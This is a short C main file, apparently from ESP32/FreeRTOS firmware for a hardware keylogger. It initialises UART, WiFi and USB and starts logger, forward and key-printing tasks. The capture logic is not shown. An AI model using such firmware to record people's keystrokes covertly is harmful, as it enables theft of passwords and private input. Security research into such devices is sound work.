#include <stdio.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "configKeylogger.h"
#include "forward_task/forward_task.h"
#include "logger_task/logger_task.h"
#include "uart_task/uart_task.h"
#include "printkey_task/printkey_task.h"

void app_main()
{
    uart_init();
    wifi_init();
    usb_device_init();
     
    xTaskCreate(uart_task, "uart_task", KEYLOGGER_TASK_STACK_SIZE, NULL, 9, NULL);

    xTaskCreate(logger_task, "logger_task", KEYLOGGER_TASK_STACK_SIZE, NULL, 6, NULL);
    xTaskCreate(forward_task, "forward_task", KEYLOGGER_TASK_STACK_SIZE, NULL, 7, NULL);
    xTaskCreate(printkey_task, "printkey_task", KEYLOGGER_TASK_STACK_SIZE, NULL, 4, NULL);

}
